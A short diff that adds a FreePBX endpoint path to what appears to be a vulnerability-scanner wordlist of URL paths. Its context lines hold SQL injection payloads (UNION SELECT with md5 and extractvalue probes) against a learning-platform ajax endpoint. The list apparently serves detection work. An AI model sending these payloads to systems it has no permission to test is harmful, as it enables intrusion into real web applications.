@@ -129,3 +129,4 @@
 /?rest_route=/my-calendar/v1/events&from=1
 /main/inc/ajax/model.ajax.php?a=get_sessions_tracking&work_id=1&rows=0&page=1&sidx=0&sord=test&_search=1&searchField=1))and(1)%20UNION%20ALL%20SELECT%20CONCAT((select+md5({{num}}))),NULL,NULL,NULL--%20-)and((1=&searchOper=ni&searchString=testx&filters2={}&from_course_session=0
 /main/inc/ajax/model.ajax.php?a=get_sessions_tracking&work_id=1&rows=0&page=1&sidx=0&sord=test&_search=1&searchField=1))and(1)%20UNION%20ALL%20SELECT%20CONCAT((select+extractvalue(0x0a,concat(0x0a,(md5({{num}})))))),NULL,NULL,NULL--%20-)and((1=&searchOper=ni&searchString=testx&filters2={}&from_course_session=0
+/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x
